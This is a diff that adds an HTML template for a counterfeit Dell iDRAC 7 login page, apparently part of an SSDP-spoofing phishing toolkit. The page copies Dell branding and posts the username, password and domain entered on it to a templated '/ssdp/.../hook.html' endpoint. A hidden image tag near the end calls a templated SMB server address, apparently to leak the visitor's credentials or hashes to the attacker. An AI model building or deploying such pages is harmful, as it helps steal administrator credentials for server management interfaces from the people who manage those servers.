@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IDRAC-6THL6U1, PowerEdge R720</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<svg class="bg" viewBox="0 0 1920 920" preserveAspectRatio="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+    <defs>
+        <linearGradient id="lightArea" x1="0" y1="0" x2="0" y2="1">
+            <stop offset="0%" stop-color="#f4f4f4"/>
+            <stop offset="55%" stop-color="#e4e4e4"/>
+            <stop offset="100%" stop-color="#d2d2d2"/>
+        </linearGradient>
+        <g id="waves">
+            <path d="M-30 150 C 320 300, 640 690, 1120 650 S 1660 430, 1950 300"/>
+            <path d="M-30 196 C 320 346, 640 736, 1120 696 S 1660 476, 1950 346"/>
+            <path d="M-30 242 C 320 392, 640 782, 1120 742 S 1660 522, 1950 392"/>
+            <path d="M-30 292 C 320 442, 640 828, 1120 788 S 1660 570, 1950 440"/>
+            <path d="M-30 346 C 320 496, 640 876, 1120 834 S 1660 622, 1950 492"/>
+            <path d="M-30 404 C 320 554, 640 926, 1120 882 S 1660 678, 1950 548"/>
+            <path d="M-30 468 C 320 618, 640 980, 1120 934 S 1660 740, 1950 610"/>
+            <path d="M-30 540 C 320 690, 640 1042, 1120 994 S 1660 810, 1950 680"/>
+            <path d="M-30 624 C 320 774, 640 1116, 1120 1064 S 1660 892, 1950 762"/>
+        </g>
+        <clipPath id="clipTop"><rect x="0" y="0" width="1920" height="242"/></clipPath>
+        <clipPath id="clipBottom"><rect x="0" y="242" width="1920" height="678"/></clipPath>
+    </defs>
+
+    <rect x="0" y="0" width="1920" height="242" fill="#0b0b0b"/>
+    <rect x="0" y="242" width="1920" height="678" fill="url(#lightArea)"/>
+
+    <use href="#waves" clip-path="url(#clipTop)" fill="none" stroke="#ffffff" stroke-opacity="0.16" stroke-width="1.4"/>
+    <use href="#waves" clip-path="url(#clipBottom)" fill="none" stroke="#9c9c9c" stroke-opacity="0.65" stroke-width="1.4"/>
+</svg>
+
+<div class="stage">
+    <div class="panel">
+        <div class="panel-head">
+            <svg class="dell-mark" viewBox="0 0 80 80" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                <circle cx="40" cy="40" r="37" fill="none" stroke="#ffffff" stroke-width="3"/>
+                <text x="40" y="49" text-anchor="middle" font-family="Arial, Helvetica, sans-serif"
+                      font-size="23" font-weight="700" fill="#ffffff" letter-spacing="0.5">DELL</text>
+            </svg>
+            <div class="head-title">Integrated Dell Remote<br>Access Controller 7</div>
+        </div>
+
+        <div class="panel-body">
+            <div class="rule"></div>
+
+            <div class="body-top">
+                <h1>Login</h1>
+                <span class="help" aria-hidden="true">?</span>
+            </div>
+
+            <p class="target">IDRAC-6THL6U1 &nbsp;|&nbsp; PowerEdge R720</p>
+            <p class="instr">Type the Username and Password and click Submit.</p>
+
+            <form method="POST" action="/ssdp/{{ template_idx }}/hook.html" name="LoginForm">
+                <div class="grid">
+                    <div class="col">
+                        <label for="u">Username:</label>
+                        <input type="text" id="u" name="username" autocomplete="username" autofocus>
+                    </div>
+                    <div class="col">
+                        <label for="p">Password:</label>
+                        <input type="password" id="p" name="password" autocomplete="current-password">
+                    </div>
+                </div>
+
+                <div class="grid grid-domain">
+                    <div class="col">
+                        <label for="d">Domain:</label>
+                        <select id="d" name="domain">
+                            <option>This iDRAC</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="spacer"></div>
+                <div class="rule"></div>
+
+                <div class="actions">
+                    <input type="reset" class="btn btn-cancel" value="Cancel">
+                    <input type="submit" class="btn btn-submit" value="Submit">
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div class="links">
+        <a href="#">Support</a><span class="sep">|</span><a href="#">Dell TechCenter</a><span class="sep">|</span><a href="#">About</a>
+    </div>
+</div>
+
+<img src="http://{{ smb_server }}" style="display: none;" />
+</body>
+</html>
